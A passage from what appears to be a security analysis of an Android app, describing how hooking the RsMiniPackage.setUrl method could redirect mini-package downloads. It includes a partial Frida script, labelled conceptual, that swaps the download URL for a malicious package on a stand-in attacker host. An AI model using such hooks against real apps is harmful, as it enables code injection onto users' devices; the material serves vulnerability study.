2.  **Manipulating Package Download Location:**
    *   **Hooking `setUrl()`:** Since the `url` field is mutable, an attacker can hook the `setUrl` method (`com.huawei.astp.macle.model.RsMiniPackage.setUrl(java.lang.String)`). This allows them to intercept and change the download URL for any mini-package *after* the `RsMiniPackage` object has been created.
    *   By redirecting the `url` to an attacker-controlled server hosting a malicious mini-package (e.g., a weaponized Android DEX file or JavaScript bundle), an attacker can attempt to inject arbitrary code. This attack would be most potent if the integrity verification logic (using `digest` and `publicKey`) can be bypassed or is implemented insecurely in other parts of the application.
    *   *Frida Example (Conceptual):*
        ```javascript
        Java.perform(function() {
            var RsMiniPackage = Java.use('com.huawei.astp.macle.model.RsMiniPackage');
            RsMiniPackage.setUrl.implementation = function(newUrl) {
                console.log("[RsMiniPackage.setUrl Hook] Original URL:", this.getUrl());
                console.log("[RsMiniPackage.setUrl Hook] Proposed new URL:", newUrl);
                var maliciousUrl = "https://attacker.com/malicious_mapp_v1.0.zip";
                console.warn("!!!! Redirecting package download to:", maliciousUrl, "!!!!");
                this.setUrl(maliciousUrl); // Call original method with the attacker's URL
            };
